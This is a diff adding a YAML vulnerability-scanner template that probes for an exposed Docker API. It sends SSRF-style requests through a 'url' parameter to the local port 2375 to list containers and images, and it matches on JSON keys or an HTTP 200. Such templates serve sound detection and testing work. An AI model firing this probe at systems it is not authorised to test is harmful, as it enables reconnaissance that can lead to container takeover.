@@ -1,0 +1,25 @@
+id: docker-api-infoleak
+
+info:
+  name: Docker Infoleaks via Open Docker API
+  author: Jake Lo.ai
+  severity: high
+  description: Extracting container and image information via exposed Docker API.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://127.0.0.1:2375/containers/json"
+      - "{{BaseURL}}/?url=http://127.0.0.1:2375/images/json"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"Id":'
+          - '"Names":'
+          - '"RepoTags":'
+      - type: status
+        status:
+          - 200
